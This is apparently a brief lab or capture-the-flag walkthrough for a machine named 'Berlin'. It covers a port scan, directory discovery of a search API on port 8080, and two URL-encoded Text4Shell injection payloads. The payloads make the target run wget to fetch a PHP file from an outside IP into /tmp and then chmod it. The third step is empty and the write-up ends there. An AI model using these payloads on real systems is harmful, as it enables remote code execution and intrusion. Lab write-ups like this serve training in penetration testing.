# Berlin

I start off by scanning for open ports:

<figure><img src="../../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

So first i go and see on port 8080 there is a api, i discover page search trhough dirb:

<figure><img src="../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

test4shell:

```
#step 1
%2Fsearch%3Fquery%3D%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27wget%20192.168.45.226%2Fmonkey.php%20-O%20%2Ftmp%2Fmonkey.php%27%29%7D

#step 2
%2Fsearch%3Fquery%3D%24{script%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('chmod 777 %2Ftmp%2Fmonkey.php')}

#step 3

```
